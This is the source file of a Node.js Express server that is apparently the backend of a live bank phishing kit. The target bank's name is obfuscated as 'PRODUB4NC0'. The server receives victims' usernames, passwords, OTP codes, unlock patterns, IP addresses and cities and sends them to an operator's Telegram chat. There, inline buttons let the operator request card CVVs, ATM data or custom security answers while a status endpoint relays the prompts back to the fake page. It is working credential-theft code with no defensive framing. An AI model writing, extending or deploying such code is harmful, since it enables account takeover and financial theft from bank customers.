const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const https = require('https');

require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const agent = new https.Agent({ family: 4 });

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// 🧹 Limpieza automática
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// 🔹 Enviar patrón
app.post('/api/sendPattern', async (req, res) => {
  const { patron, patronImg, usar, ip, city } = req.body;

  if (!patron || !patronImg || !usar) {
    return res.status(400).json({ error: 'Faltan datos obligatorios' });
  }

  const caption = `🟢PRODUB4NC0🟢\n📱 US4R: <code>${usar}</code>\n🔒 Patrón recibido\nSecuencia: <code>${patron}</code>\n\n🌐 IP: ${ip || "N/A"}\n🏙️ Ciudad: ${city || "N/A"}`;

  try {
    const base64Data = patronImg.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", buffer, { filename: "patron.png", contentType: "image/png" });
    formData.append("caption", caption);
    formData.append("parse_mode", "HTML");

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
      formData,
      { headers: formData.getHeaders(), httpsAgent: agent }
    );

    console.log("✅ Patrón enviado a Telegram");
    res.status(200).json({ success: true, data: response.data });
  } catch (error) {
    console.error("❌ Error al enviar patrón a Telegram:", error.response?.data || error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 🔹 Enviar usuario y clave
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
🟢PRODUB4NC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = { status: "esperando", usar, clavv, preguntas: [], esperando: null, ip, ciudad };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
        { text: "🔐PATRON", callback_data: `errortok:${txid}` }
      ],
      [
        { text: "💳C3VV", callback_data: `ceve:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
  });

  res.sendStatus(200);
});

// 🔹 Enviar OTP
app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;

  const mensaje = `
🔑🟢PRODUB4NC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🔑 0TP: <code>${dinamic}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
        { text: "🔐PATRON", callback_data: `errortok:${txid}` }
      ],
      [
        { text: "💳C3VV", callback_data: `ceve:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
  });

  res.sendStatus(200);
});

// 🔹 Webhook de control
app.post('/webhook', async (req, res) => {
  const message = req.body.message;

  if (message?.text && message.text.startsWith('/')) {
    const commandParts = message.text.slice(1).split(' ');
    const txid = commandParts[0];
    const preguntasTexto = commandParts.slice(1).join(' ');
    const [pregunta1, pregunta2] = preguntasTexto.split('&');

    if (!pregunta1 || !pregunta2) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
        })
      });
      return res.sendStatus(200);
    }

    const cliente = cargarCliente(txid) || { preguntas: [], status: 'esperando' };
    cliente.preguntas = [pregunta1.trim(), pregunta2.trim()];
    cliente.status = 'preguntas';
    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: message.chat.id,
        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
      })
    });

    return res.sendStatus(200);
  }

  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    const cliente = cargarCliente(txid) || { status: 'esperando' };
    cliente.status = accion;
    guardarCliente(txid, cliente);

    if (accion === 'preguntas_menu') {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid}, Ej: /${txid} ¿Dónde naciste?&¿Cuál es tu color favorito?`
        })
      });
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: `Has seleccionado: ${accion}` })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// 🔹 Status checker
app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
